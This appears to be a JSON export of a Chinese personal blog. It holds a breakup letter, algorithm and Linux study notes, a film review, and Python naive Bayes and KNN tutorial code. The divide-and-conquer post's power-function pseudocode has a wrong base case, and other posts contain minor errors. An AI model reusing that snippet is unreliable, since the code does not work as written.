对不起，是我辜负了你，是我欺骗了你的感情，许给你生生世世，却只给了你一百零九日的须臾感情，但只怕再久了，就难以分开了，就会更痛了。希望你能把我当做懦夫，当做骗子，当做人渣，只希望你能好受些，对不起，是我，辜负了你。 希望你能多出去走走，多散散心，希望你能遇到一个更爱你，能陪你过一辈子的人，希望你，珍重。","categories":[{"name":"文学","slug":"文学","permalink":"https://liuyi12138.github.io/categories/文学/"}],"tags":[{"name":"心声","slug":"心声","permalink":"https://liuyi12138.github.io/tags/心声/"}]},{"title":"算法学习笔记之分治法","slug":"算法学习笔记之分治法","date":"2018-04-09T06:23:40.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/09/算法学习笔记之分治法/","link":"","permalink":"https://liuyi12138.github.io/2018/04/09/算法学习笔记之分治法/","excerpt":"没有什么问题是分割成两半还解决不了的，如果有，就再分一次。╭（╯＾╰）╮","text":"没有什么问题是分割成两半还解决不了的，如果有，就再分一次。╭（╯＾╰）╮ 分治法的设计思想将一个难以直接解决的大问题，分割成一些规模较小的与原问题形式相同的子问题，用递归解决这些子问题，然后将子问题的解合并即为原问题的解。 分治法的适用范围 １．该问题的规模缩小后可以容易地解决。 ２．该问题可以分解为若干个规模较小的相同问题。 ３．该问题的子问题的解可以合并。 ４．该问题的各个子问题相互独立。 TIP:如果一个问题具备前两条特征，但不具备第三条，可以考虑贪心算法或动态规划TIP:如果一个问题不具备第四条特征，分治法的效率降低，用动态规划较好。 分治法的基本步骤分治法在每一层递归上都有三个步骤：step1 分解：将原问题分解为若干个规模较小，相互独立，与原问题形式相同的子问题； step2 解决：若子问题规模较小而容易被解决则直接解，否则递归地解各个子问题 step3 合并：将各个子问题的解合并为原问题的解。 可使用分治法求解的经典问题 二分搜索 大整数乘法 Strassen矩阵乘法 棋盘覆盖 归并排序 快速排序 线性时间选择 最接近点对问题 循环赛日程表 汉诺塔 ### 分治法实例 1.求ｘ的ｎ次幂时间复杂度为O(lgn)个人感悟：感觉有二分法的思想。12345678sum(x,n)if(x==1) result=x;if(x%2==0) result=sum(x,n/2)*sum(x,n/2);else result=sum(x,(n+1)/2)*sum(x,(n-1)/2);return result; 2.归并排序个人感悟：归并排序与快速排序的区别在于１．使用二分法时，快速排序两边个数不一定相等，归并排序一定相等。２．快速排序不需要额外数组。３．快速排序不稳定，归并排序稳定。 12.20.1.png 合并方法：用两个指针分别指向两个子数组第一个元素，然后总是把小的数字填入结果中并将对应指针往右移一位；如果其中一个指针到头了，则直接把另外一个指针没到头的数组的剩余元素填入结果。 3.最大子数组问题时间复杂度O(nlgn) 将数组等分，讨论最大子数组的位置: 1.完全在左边或者右边。 2.跨越中点。第一种情况直接递归找出最大子数组，第二种情况从中点开始向两边寻找最大子数组，问题的解就是两种情况里面和最大的那个子数组。关于最大子数组问题，也可以用动态规划的思想做，区别参照归并排序与快速排序的区别。 最大子数组问题 参考链接TIP:参考链接中还有许多其他链接也是非常好的学习素材哦。理论部分示例部分1示例部分２","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/tags/算法/"}]},{"title":"鸟哥的Linux私房菜学习笔记","slug":"鸟哥的Linux私房菜学习笔记","date":"2018-04-09T06:18:36.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2018/04/09/鸟哥的Linux私房菜学习笔记/","link":"","permalink":"https://liuyi12138.github.io/2018/04/09/鸟哥的Linux私房菜学习笔记/","excerpt":"鸟哥的Linux私房菜—-第零章 计算机概论","text":"鸟哥的Linux私房菜—-第零章 计算机概论 鸟哥的Linux私房菜—-第零章 计算机概论0.1电脑0.11计算机硬件的五大单元输入单元、输出单元、CPU内部的控制单元、算数逻辑单元、内存 0.11.1.png 0.12CPU的架构1.精简指令集（PISC) PISC的微指令集较为精简，每个指令的执行时间都很短，完成的动作也很单纯，指令的执行性能较佳。 2.复杂指令集（CISC) CISC在微指令集的每个小指令可以执行一些较低阶的硬件操作，指令数目多而且复杂， 每条指令的长度并不相同。 因为指令执行较为复杂所以每条指令花费的时间较长， 但每条个别指令可以处理的工作较为丰富。 TIPS:所谓的位指的是CPU一次数据读取的最大量！ 0.13其他单元的设备1.系统单元：系统单元包括 CPU 与内存及主板相关元件。 主板上还有很多的连接接口与相关的适配卡（网卡、 磁盘阵列卡、显卡等等）。 2.存储单元：包括内存 （main memory, RAM） 与辅助内存， 辅助内存就是“储存设备”，包括硬盘、软盘、光盘、磁带等等。 3.输入、输出单元：触摸屏、键盘、鼠标等等，屏幕，打印机，投影机等等。 CPU=脑袋瓜子； 内存=脑袋中放置正在被思考的数据的区块； 硬盘=脑袋中放置回忆的记忆区块； 主板=神经系统； 各项周边设备=人体与外界沟通的手、脚、皮肤、眼睛等； 显卡=脑袋中的影像； 电源供应器 （Power）=心脏； 0.15电脑按用途分类超级计算机、大型计算机、迷你电脑、工作站、微电脑 0.16电脑上面常用的计算单位 1 Byte = 8 bits 0.2个人电脑架构与相关设备原件 早期芯片组分南北桥 1）北桥：负责链接速度较快的CPU、内存与显卡接口等元件。 2）南桥：负责连接速度较慢的设备接口， 包括硬盘、USB、网卡等等。 因此目前的主流架构中， 大多将北桥内存控制器整合到 CPU 封装当中了（方便CPU与内存的交流）。 [外链图片转存中…(img-acrItlAD-1570972088936)] 0.21CPU评判性能指标：频率（只能比较同款CPU的速度）、微指令集、架构、内存容量 1.CPU的工作频率：外频与倍频 外频指的是CPU与外部元件进行数据传输时的速度 倍频则是 CPU 内部用来加速工作性能的一个倍数 两者相乘才是CPU的频率速度 超频：将CPU的倍频或者是外频通过主板的设置功能更改成较高频率的一种方式。 但因为CPU的倍频通常在出厂时已经被锁定而无法修改， 因此较常被超频的为外频。 一般来说，每次频率能够传输的数据量，大多为64 位，这个 64 位就是所谓的“宽度”。 内存使用系统总线带宽来与 CPU 沟通，而显卡则通过PCI-E的序列信道设计来与CPU沟通。 CPU可以从内存中取得的最快带宽=频率速度*系统总线宽 2.超线程 （Hyper-Threading, HT） 在每一个CPU 内部将重要的寄存器 （register） 分成两群， 而让程序分别使用这两群寄存器。 也就是说，可以有两个程序“同时竞争 CPU 的运算单元”，而非通过操作系统的多任务切换。 0.22内存个人电脑的内存主要元件为动态随机存取内存（Dynamic Random Access Memory, DRAM）， 随机存取内存只有在通电时才能记录与使用，断电后数据就消失了。因此我们也称这种RAM为挥发性内存。 DRAM使用广泛的主要是SDRAM与DDR SDRAM， DDR是所谓的双倍数据传送速度（Double Data Rate）， 他可以在一次工作周期中进行两次数据的传送。 1.多通道设计 将多个内存汇整在一起，加大总线宽度。 要求：必须要安插两支（或四支）内存，除了容量大小要一致之外，型号也最好相同。 2.DRAM与SRAM SRAM在设计上使用的电晶体数量较多，价格较高，且不易做成大容量， 不过由于其速度快， 因此整合到CPU内成为高速缓存内存以加快数据的存取是个不错的方式。 第二层高速缓存（L2 cache）整合到CPU内部，因此这个L2内存的速度必须要CPU频率相同。 使用DRAM是无法达到这个频率速度的，此时就需要静态随机存取内存（StaticRandom Access Memory, SRAM）。 3.只读存储器（ROM） 主板上面如果有内置的网卡或者是显卡时，该功能是否要启动与该功能的各项参数， 是被记录到主板上头的一个称为CMOS的芯片上，这个芯片需要借着额外的电源来发挥记录功能。 而CMOS内的数据通过ROM来读取与更新。 BIOS（Basic Input Output System）是一套程序，这套程序是写死到主板上面的一个内存芯片中， 这个内存芯片在没有通电时也能够将数据记录下来，那就是只读存储器（Read Only Memory, ROM）。 固件（firmware）很多也是使用ROM来进行软件的写入的。 ROM是一种非挥发性的内存 0.23显卡 VGA（Video Graphics Array）显卡主要也是通过CPU的控制芯片来与CPU、内存等沟通. 显卡需要的内存=分辨率（像素个数）*每个像素占用的容量 0.24硬盘与储存设备电脑系统上面的储存设备包括有：硬盘、软盘、MO、CD、DVD、磁带机、U盘（闪存）、 还有新一代的蓝光光驱等， 乃至于大型机器的区域网络储存设备（SAN, NAS）等等。 在硬盘盒里面其实是由许许多多的圆形盘片、机械手臂、 磁头与主轴马达所组成的。 实际的数据都是写在具有磁性物质的盘片上头，而读写主要是通过在机械手臂上的磁头（head）来达成。 实际运行时， 主轴马达让盘片转动，然后机械手臂可伸展让磁头在盘片上头进行读写的动作。 另外，由于单一盘片的容量有限，因此有的硬盘内部会有两个以上的盘片。 磁盘的最小物理储存单位是扇区。 同一个同心圆的扇区组合成的圆就是所谓的磁道（track）。 由于磁盘里面可能会有多个盘片，因此在所有盘片上面的同一个磁道可以组合成所谓的柱面 （cylinder）。 （同心圆外圈的圆比较大，占用的面积多，所以外围的圆会有更多的扇区） 传输接口 传统磁盘接口包括有 SATA, SAS, IDE 与 SCSI 等等。 若考虑外接式磁盘，那就还包括了 USB, eSATA 等等接口 1.SATA接口 SATA线比较窄小，所以对于安装与机箱内的通风都比较好。 由于SATA一条排线仅接一颗硬盘，所以不需要调整跳针。 SATA 传输接口传输时，通过的数据演算法的关系，当传输 10 位编码时，仅有 8 位为数据， 其余 2 位为检验之用。因此带宽的计算上面， 使用的换算 （bit 转 Byte） 为 1:10 而不是 1Byte=8bits。 2.SAS接口 串行式 SCSI （Serial Attached SCSI, SAS） 这种接口的速度比 SATA 来的快，而且连接的 SAS 硬盘的盘片转速与传输的速度也都比 SATA 硬盘好。 3.USB接口 USB接口是外接式的接口，也是目前最常见到的外接式磁盘接口。 固态硬盘 固态硬盘最大的好处是，它没有马达不需要转动，而是通过内存直接读写的特性， 因此除了没数据延迟且快速之外，还很省电。 传统磁盘 （Hard Disk Drive, HDD） 固态硬盘 （Solid State Disk 或 Solid State Driver, SSD） 对磁盘的评判指标：HDD或SSD、容量、缓冲内存、转速 0.25扩展卡与接口PCIe 的好处：兼容性- x16 的卡安装在 x16 的插槽，但是这个插槽仅有 x4 的电路设计，这张卡也能运行。 一般服务器惯用的扩展卡，大多数都使用 PCIe x8 的接口 。 为了增加扩展卡的数量，因此服务器级的主板才会大多使用到 x8 的插槽 要发挥扩展卡的能力，就得要搭配相对应的插槽才行。 0.26主板1.设备I/O位址与IRQ中断信道 I/O-&gt;各设备的门牌号码 IRQ-&gt;各个门牌连接到邮件中心（CPU）的专门路径 2.CMOS与BIOS CMOS主要的功能为记录主板上面的重要参数， 包括系统时间、CPU电压与频率、各项设备的I/O位址与IRQ等。 BIOS为写入到主板上某一块 flash 或 EEPROM 的程序，他可以在开机的时候执行，以载入CMOS当中的参数， 并尝试调用储存设备中的开机程序，进一步进入操作系统当中。 3.连接周边设备的接口 1.PS/2接口：这原本是常见的键盘与鼠标的接口，不过目前渐渐被USB接口取代， 甚至较新的主板可能就不再提供 PS/2 接口了。 2.USB接口：通常只剩下 USB 2.0 与 USB 3.0，为了方便区分，USB 3.0 为蓝色的插槽颜色。 3.声音输出、输入与麦克风：这个是一些圆形的插孔，而必须你的主板上面有内置音效芯片时，才会有这三个东西。 4.RJ-45网络头：如果有内置网络芯片的话，那么就会有这种接头出现。 这种接头有点类 似电话接头，不过内部有八蕊线！接上网络线后在这个接头上会有灯号亮起才对。 5.HDMI：如果有内置显示芯片的话，可能就会提供这个与屏幕连接的接口了！ 这种接口可以同时传输声音与影像， 目前也是电视机屏幕的主流连接接口。 0.3数据表示方式数字系统文字编码系统 0.4软件程序执行0.41操作系统1.操作系统核心（Kernel）操作系统的功能就是让CPU可以开始判断逻辑与运算数值、 让内存可以开始载入/读出数据与程序码、让硬盘可以开始被存取、让网卡可以开始传输数据、 让所有周边可以开始运行等等。总之，硬件的所有动作都必须要通过这个操作系统来达成。 2.系统调用（System Call）操作系统其实就是核心与其提供的接口工具 1.操作系统的核心层直接参考硬件规格写成，所以同一个操作系统程序不能够在不一样的硬件架构下运行。2.操作系统只是在管理整个硬件资源，包括CPU、内存、输入输出设备及文件系统文件。3.应用程序的开发都是参考操作系统提供的开发接口， 所以该应用程序只能在该操作系统上面运行而已，不可以在其他操作系统上面运行的。 3.核心功能核心主要是在负责整个电脑系统相关的资源分配与管理， 因此，核心至少也要有这些功能的：1.系统调用接口（System call interface）2.程序管理（Process control）3.内存管理（Memory management）4.文件系统管理（Filesystem management）5.设备的驱动（Device drivers） 4.操作系统与驱动程序操作系统必须要能够驱动硬件，如此应用程序才能够使用该硬件功能；一般来说，操作系统会提供开发接口，让开发商制作他们的驱动程序；要使用新硬件功能，必须要安装厂商提供的驱动程序才行；驱动程序是由厂商提供的，与操作系统开发者无关。 0.42应用程序应用程序是参考操作系统提供的开发接口所开发出来软件，这些软件可以让使用者操作，以达到某些电脑的功能利用。 0.5重点回顾1.计算机的定义为：“接受使用者输入指令与数据，经由中央处理器的数学与逻辑单元运算处理后，以产生或储存成有用的信息” 2.电脑的五大单元包括：输入单元、输出单元、控制单元、算数逻辑单元、存储单元五大部分。其中CPU占有控制、算逻辑单元，存储单元又包含内存与辅助内存；数据会流进/流出内存是CPU所发布的控制命令，而CPU实际要处理的数据则完全来自于内存； 3.CPU依设计理念主要分为：精简指令集（RISC）与复杂指令集（CISC）系统；关于CPU的频率部分：外频指的是CPU与外部元件进行数据传输时的速度，倍频则是CPU内部用来加速工作性能的一个倍数， 两者相乘才是CPU的频率速度； 4.新的 CPU 设计中，已经将北桥的内存控制芯片整合到 CPU 内，而 CPU 与内存、显卡沟通的总线通常称为系统总线。 南桥就是所谓的输入输出（I/O）总线，主要在联系硬盘、USB、网卡等周边设备； 5.CPU每次能够处理的数据量称为字组大小（word size），字组大小依据CPU的设计而有32位与64位。 我们现在所称的电脑是32或64位主要是依据这个 CPU解析的字组大小而来的！ 6.个人电脑的内存主要元件为动态随机存取内存（Dynamic Random Access Memory,DRAM）， 至于CPU内部的第二层高速缓存则使用静态随机存取内存（Static RandomAccess Memory, SRAM）； 7.BIOS（Basic Input Output System）是一套程序，这套程序是写死到主板上面的一个内存芯片中， 这个内存芯片在没有通电时也能够将数据记录下来，那就是只读存储器（Read Only Memory, ROM）； 8.目前主流的外接卡接口大多为 PCIe 接口，且最新为 PCIe 3.0，单信道速度高达1GBytes/s。 9.常见的显卡连接到屏幕的接口有 HDMI/DVI/D-Sub/Display port 等等。HDMI 可同时传送影像与声音。 10.传统硬盘的组成为：圆形盘片、机械手臂、 磁头与主轴马达所组成的，其中盘片的组成为扇区、磁道与柱面； 11.磁盘连接到主板的接口大多为 SATA 或 SAS，目前台式机主流为 SATA 3.0，理论极速可达 600MBytes/s。 12.常见的文字编码为 ASCII，繁体中文编码主要有 Big5 及 UTF8 两种，目前主流为 UTF8操作系统（Operating System, OS）其实也是一组程序， 这组程序的重点在于管理电脑的所有活动以及驱动系统中的所有硬件。 13.电脑主要以二进制作为单位，常用的磁盘容量单位为Bytes，其单位换算为1 Byte =8bits。 14.最阳春的操作系统仅在驱动与管理硬件，而要使用硬件时，就得需要通过应用软件或者是壳程序（shell）的功能， 来调用操作系统操纵硬件工作。目前称为操作系统的，除了上述功能外，通常已经包含了日常工作所需要的应用软件在内了。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://liuyi12138.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://liuyi12138.github.io/tags/Linux/"}]},{"title":"理想里的真实--《无问西东》影评","slug":"理想里的真实--《无问西东》影评","date":"2018-04-09T06:13:36.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/09/理想里的真实--《无问西东》影评/","link":"","permalink":"https://liuyi12138.github.io/2018/04/09/理想里的真实--《无问西东》影评/","excerpt":"《无问西东》是我期盼了很久的一部电影，今天终于有时间去看．一直听说大家对这部电影的评价好坏参半，所以之前没有去看评论，为的就是能有自己最真切的感受，而不是带着有色眼镜去欣赏．看完后再看影评，果不其然，正所谓仁者见仁智者见智，每个人的着眼点不同，看到的自然也不同.","text":"《无问西东》是我期盼了很久的一部电影，今天终于有时间去看．一直听说大家对这部电影的评价好坏参半，所以之前没有去看评论，为的就是能有自己最真切的感受，而不是带着有色眼镜去欣赏．看完后再看影评，果不其然，正所谓仁者见仁智者见智，每个人的着眼点不同，看到的自然也不同. 从影评来看，大家对这部影片的态度截然不同，有的人把它捧上了天，有的人却把它贬得一文不值．在我看来，不过是切入点不同，认为它好的人赞赏的是其中蕴含的清华精神，只问理想，无问西东；而另一部分人则是从影片本身出发，认为影片杂乱无章，不能凸显主旨．一方面是从理想看去，一方面是从现实展开，我不再评论影片的优劣，我想谈谈我自己在影片看到的，理想里的真实． 什么是真实 在第二个故事里，梅贻琦校长给予吴岭澜的点拨无疑是最大的亮点，这个故事虽短，却是整个影片的精神核心．吴岭澜的回答”因为最好的学生都念实科．”让人想起了有一年《奇葩说》的舞台上的那个清华博士生，有着三个学位的他最终问评委＂我该找一个怎样的工作？＂高晓松对其破口大骂，怒其不争．我想梅校长的一席话正是对其最好的劝告，当然在我的生活里也有许多这样的事情，太多人把自己置身于一种麻木的忙碌、踏实中，以为这样就能无愧于心，其实不过是在麻痹自己．清华的这种精神不仅适用与清华学生，更适用于当今所有大学生，甚至所有的迷失于现实的青年人．什么是真实，真实就是你看到什么、听到什么、做什么、和谁在一起，有一种，从心灵深处满溢出来的不懊悔、也不羞耻的平和、与喜悦．扣问我心，无怨前行，即是真实． 理想与世俗 想到这里不得不提影片的一个画面，想起光耀母亲的话：＂你一生所要追求的功名利禄，没有什么是你的祖上没经历过的，那些只不过是人生的幻光。＂说来也是，世上再多荣耀与名利，先辈总有人经历过，而他们没经历过的反而是人间百味，比如读万卷书行万里路，比如同你喜欢的女孩子结婚生子．人生在世究竟为了什么，没有人知道答案． 在影片里，泰戈尔讲到“因此我竭我的至诚恳求你们不要错走路，不要惶惑，不要忘记你们的天职，千成不要理会那恶俗的力量的引诱，诞妄的巨体的叫唤，拥积的时尚与无意识，无目的的营利的诱惑。”，就是想让人们知道，原来这些卓越的人物，也认为花时间思考这些，谈论这些，是重要的。我想每一个人，活在世上，或多或少都会去思索生命的意义，可最终，是否被世俗吞没，则看能不能坚守本心． 当有一天，你被世俗缠身，烦躁不安，不如回头想想，我走到这一步，究竟为了什么．今日看电影时我还有很多事，期间还不断联系人去开会以及准备自己的会议，看到这里再也没忍住哭了出来，眼泪像决堤的洪水，心里积攒的委屈，烦闷一下子喷涌而出，生活太累，可我们不愿放下的，不就是那一丝梦想，那看不到诗与远方． 人性的善与恶 人性究竟是善还是恶？是个古老的问题了,《三字经》第一句便是＂人之初，性本善＂，荀子则认为人性本恶，但作为一个活生生的人，必定都会有善恶，自私，同情，恻隐，都是人性的部分，人都是有缺点的，用易中天先生的话说，只有不完美的人才是可爱的人．而在影片中，这个主题则展现得淋漓尽致． 在我看来，李想对王敏佳的抛弃便是人性自私的体现，但自私不是恶，我在想，若我是李想，我能不能勇敢地站出来？我的答案是，若是没有爱，自然也不会站出来．不是敢不敢承担的问题，而是人本能都是在为自己着想的．再回首看江歌案，不也是如此，自私本就是人性的部分，甚至可以说，人类能走到这一步，也许就是自私的产物． 同样，电影里表现的还有人之恻隐，我并不喜欢沈光耀的这句话＂这个时代缺的不是完美的人，缺的是从自己心底给出的，真心，正义，无畏，和同情。＂也许是因为它太中二，这种话语，不是我等凡夫俗子能有的共鸣，但其中恻隐之心，倒是能理解． 影片里塑造的最好的人物，莫过于师母了吧，一个完完全全的普通人，活在对爱追求的路上，嫉妒，任性，小家子气，却又大度，内省，太像一个活生生的人．当她发现因为自己的一时冲动造成王敏佳的死之后的那种一瞬间的自责，后悔以及紧接着的害怕,不正是人性最好的体现么． 时代与民意 文革时期的故事倒也看了不少，之前的《芳华》加上这次的《无问西东》，都让人觉得那个时代的无奈．最近听了罗胖的《民意真的可信吗》，颇有感触，人民真的是太傻，在舆论中，任何事情永远只是非黑即白的，虽然有时候细节的推敲看起来毫无问题，可是整体来看，却是荒唐至极．无论在哪个时代，民意总是担任最愚蠢的角色，还记得不久前的三色幼儿园事件，网友的态度可谓是百转千回．在民意的要求下，真相往往会浮出水面，但同样，在民意的监督下，真相可能没有你想象中那么重要了． 我对这部影片最大的赞赏在于其真实，有人说它太杂乱，可我觉得，正是因为杂乱，才更像真实．影片的最后再一次让我落泪，或许它只是仅仅在展现清华雄厚的实力，可我更愿意相信，这些亲切的面孔，让影片显得更加真实，更能触动人心． 看到和听到的，经常会令你们沮丧，世俗是这样强大，强大到生不出改变它们的念头来。可是如果有机会提前了解了你们的人生，知道青春也不过只有这些日子，不知你们是否还会在意那些世俗希望你们在意的事情，比如占有多少，才更荣耀，拥有什么，才能被爱。等你们长大，你们会因绿芽冒出土地而喜悦，会对初升的朝阳欢呼跳跃，也会给别人善意和温暖。但是却会在赞美别的生命的同时，常常、甚至永远地忘了自己的珍贵。 愿你在被打击时，记起你的珍贵，抵抗恶意； 愿你在迷茫时，坚信你的珍贵，爱你所爱，行你所行，听从你心，无问西东。","categories":[{"name":"文学","slug":"文学","permalink":"https://liuyi12138.github.io/categories/文学/"}],"tags":[{"name":"影评","slug":"影评","permalink":"https://liuyi12138.github.io/tags/影评/"}]},{"title":"机器学习实战第四章朴素贝叶斯(1)","slug":"机器学习实战第四章朴素贝叶斯(1)","date":"2018-04-08T09:57:54.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/08/机器学习实战第四章朴素贝叶斯(1)/","link":"","permalink":"https://liuyi12138.github.io/2018/04/08/机器学习实战第四章朴素贝叶斯(1)/","excerpt":"朴素贝叶斯实现文本分类python 代码注释","text":"朴素贝叶斯实现文本分类python 代码注释 代码部分1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from numpy import*def loadDataSet(): postingList = [['my', 'dog', 'has', 'flea', 'problems', 'help', 'please'], ['maybe', 'not', 'take', 'him', 'to', 'dog', 'park', 'stupid'], ['my', 'dalmation', 'is', 'so', 'cute', 'I', 'love', 'him'], ['stop', 'posting', 'stupid', 'wprthless', 'garbage'], ['mr', 'licks', 'ate', 'my', 'steak', 'how', 'to', 'stop', 'him'], ['quit', 'buying', 'worthless', 'dog', 'food', 'stupid']] #进行词条切分后的文档集合 classVec = [0, 1, 0, 1, 0, 1] #1表示侮辱性文字，0表示正常言论 return postingList, classVecdef createVocabList(dataSet): vocabSet = set([]) #创建一个空集 for document in dataSet: vocabSet = vocabSet | set(document) #通过并集操作将数据传入set，并且这是一个无重复集合 return list(vocabSet)def setOfWords2Vec(vocabSet,inputSet): #vocabSet词汇表，inputSet输入文档 returnVec=[0]*len(vocabSet) #创建0向量 for word in inputSet: if word in vocabSet: returnVec[vocabSet.index(word)] = 1 else: print(\"The word :%s is not in the vocabulary!\" % word) return returnVecdef trainNb0(trainMatrix,trainCategory): #trainMatrix文档矩阵 trainCategory标签向量 numTrainDocs = len(trainMatrix) numWords = len(trainMatrix[0]) pAbusive = sum(trainCategory) / float(numTrainDocs) #P(C1) P(C2)=1-P(C1) p0Num = ones(numWords) p1Num = ones(numWords) p0Denom=2.0 ; p1Denom=2.0 for i in range(numTrainDocs): if trainCategory[i]==1: p1Num +=trainMatrix[i] #p1Num 词向量的向量相加 p1Denom += sum(trainMatrix[i]) #p1Denom 标签向量相加 else: p0Num += trainMatrix[i] p0Denom += sum(trainMatrix[i]) p1Vest = log(p1Num/p1Denom) #P(w|1) p0Vest = log(p0Num/p0Denom) #P(W|0) return p0Vest,p1Vest,pAbusiveimport bayesdef classifyNB(vec2Classify,p0Vec,p1Vec,pClass1): p1 = sum(vec2Classify * p1Vec) + log(pClass1) p0 = sum(vec2Classify * p0Vec) + log(1.0-pClass1) if p1&gt;p0: return 1 else: return 0def testingNB(): #训练及使用分类器 listOposts,listClasses=bayes.loadDataSet() myVocabList=bayes.createVocabList(listOposts) trainMat=[] for postinDoc in listOposts: trainMat.append(bayes.setOfWords2Vec(myVocabList,postinDoc)) p0V,p1V,pAb=bayes.trainNb0(trainMat,listClasses) testEntry=['love','my','dalmation'] thisDoc = array(setOfWords2Vec(myVocabList,testEntry)) print (testEntry, 'the classified as: ', classifyNB(thisDoc, p0V, p1V, pAb)) 注释部分1.Python 集合set()添加删除、交集、并集、集合操作 a=set(‘boy’) –创建set a.add(‘python’) –添加 a.update(‘python’) –把传入的元素拆分，作为个体传入 a.remove(‘python’) –删除 集合操作","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://liuyi12138.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://liuyi12138.github.io/tags/机器学习/"}]},{"title":"机器学习实战第二章KNN算法(3)","slug":"机器学习实战第二章KNN算法(3)","date":"2018-04-08T09:56:04.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/08/机器学习实战第二章KNN算法(3)/","link":"","permalink":"https://liuyi12138.github.io/2018/04/08/机器学习实战第二章KNN算法(3)/","excerpt":"归一化特征值测试算法预测函数python 代码注释","text":"归一化特征值测试算法预测函数python 代码注释 归一化特征值knn.py123456789def autoNorm(dataSet): minVals = dataSet.min(0) #找出样本集中的最小值 maxVals = dataSet.max(0) #找出样本集中的最大值 ranges = maxVals - minVals #最大最小值之间的差值 normDataSet = zeros(shape(dataSet)) #创建与样本集一样大小的零矩阵 m = dataSet.shape[0] normDataSet = dataSet - tile(minVals, (m,1)) #样本集中的元素与最小值的差值 normDataSet = normDataSet/tile(ranges, (m,1)) #数据相除，归一化 return normDataSet, ranges, minVals 测试算法knn.py1234567891011121314def datingClassTest(): hoRatio = 0.10 ＃ #选取多少数据测试分类器 datingDataMat,datingLabels = file2matrix('datingTestSet2.txt') #从datingTestSet2.txt中获取数据 normMat, ranges, minVals = autoNorm(datingDataMat) #归一化数据 m = normMat.shape[0] numTestVecs = int(m*hoRatio) #设置测试个数 errorCount = 0.0 #记录错误数量 for i in range(numTestVecs): #分类算法 classifierResult = classify0(normMat[i,:],normMat[numTestVecs:m,:],datingLabels[numTestVecs:m],3) print \"the classifier came back with: %d, the real answer is: %d\" % (classifierResult, datingLabels[i]) if (classifierResult != datingLabels[i]): errorCount += 1.0 #计算错误率 print \"the total error rate is: %f\" % (errorCount/float(numTestVecs)) print errorCount 预测函数knn.py1234567891011def classifyPerson(): resultList = ['not at all', 'in small doses', 'in large doses'] percentTats = float(input(\"percentage of time spent playing video games ?\")) #raw_inout函数允许用户输入文本行命令并返回用户所输人的命令 ffMiles = float(input(\"frequent filer miles earned per year?\")) iceCream = float(input(\"liters of ice cream consumed per year?\")) datingDataMat, datingLabels = file2matrix('datingTestSet2.txt') normMat, ranges, minVals = autoNorm(datingDataMat) inArr = array([ffMiles, percentTats, iceCream]) classifierResult = classify0((inArr-minVals)/ranges,normMat,datingLabels, 3) print(\"You will probably like this person: \", resultList[classifierResult - 1]) 错误解决python3.0版本后用input替换了raw_input","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://liuyi12138.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://liuyi12138.github.io/tags/机器学习/"}]},{"title":"机器学习实战第二章KNN算法(2)","slug":"机器学习实战第二章KNN算法(2)","date":"2018-04-08T09:55:43.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/08/机器学习实战第二章KNN算法(2)/","link":"","permalink":"https://liuyi12138.github.io/2018/04/08/机器学习实战第二章KNN算法(2)/","excerpt":"将文本记录转换为NumPy的解析程序将txt数据转换为numpy数组，将特征值与标签分离使用Matplotlib画图分析数据python 代码注释","text":"将文本记录转换为NumPy的解析程序将txt数据转换为numpy数组，将特征值与标签分离使用Matplotlib画图分析数据python 代码注释 knn.py123456789101112131415161718def file2matrix(filename): fr = open(filename) arrayOLines = fr.readlines() #读入所有行 numberOfLines = len(arrayOLines) #行数 returnMat = zeros((numberOfLines, 3)) #创建数组，数据集 zeros功能是返回一个m×n×p×...的double类零矩阵 classLabelVector = [] #标签集 index = 0 for line in arrayOLines: line = line.strip() #移除所有的回车符 strip函数见注释(1) listFromLine = line.split('\\t') #把一个字符串按\\t分割成字符串数组 split函数见注释(2) returnMat[index,:] = listFromLine[0:3] #取listFromLine的前三个元素放入returnMat classLabelVector.append(int(listFromLine[-1])) #选取listFromLine的最后一个元素依次存入classLabelVector列表中 index += 1 return returnMat, classLabelVector#datingDatamat为特征数据集，datingLabels为标签集datingDataMat, datingLabels = file2matrix('datingTestSet2.txt')#datingTestSet2.txt文件中每行有4个数据，前三个为对象特征值，第四个为对象标签。 注释部分1.strip函数函数原型声明：s为字符串，rm为要删除的字符序列s.strip(rm) 删除s字符串中开头、结尾处，位于 rm删除序列的字符s.lstrip(rm) 删除s字符串中开头处，位于 rm删除序列的字符s.rstrip(rm) 删除s字符串中结尾处，位于 rm删除序列的字符 当rm为空时，默认删除空白符（包括’\\n’, ‘\\r’, ‘\\t’, ‘ ‘)这里的rm删除序列是只要边（开头或结尾）上的字符在删除序列内，就删除掉。 2.split函数split()就是将一个字符串分裂成多个字符串组成的列表 split()当不带参数时以空格进行分割，当代参数时，以该参数进行分割 split()会分出空字符元素12345&gt;&gt;&gt; str=\"hello boy&lt;[www.doiido.com]&gt;byebye\"&gt;&gt;&gt; str.split(\"[\")[1].split(\"]\")[0]'www.doiido.com'&gt;&gt;&gt; str.split(\"[\")[1].split(\"]\")[0].split(\".\")['www', 'doiido', 'com'] 使用Matplotlib画图分析数据暂时不懂贴上代码 12345678910import numpyimport matplotlibimport matplotlib.pyplot as pltimport knnreload(knn)datingDataMat,datingLabels=kNN.file2matrix('datingTestSet2.txt')fig = plt.figure()ax = fig.add_subplot(111)ax.scatter(datingDataMat[:,1],datingDataMat[:,2],15.0*array(datingLabels),15.0*array(datingLabels))plt.show() 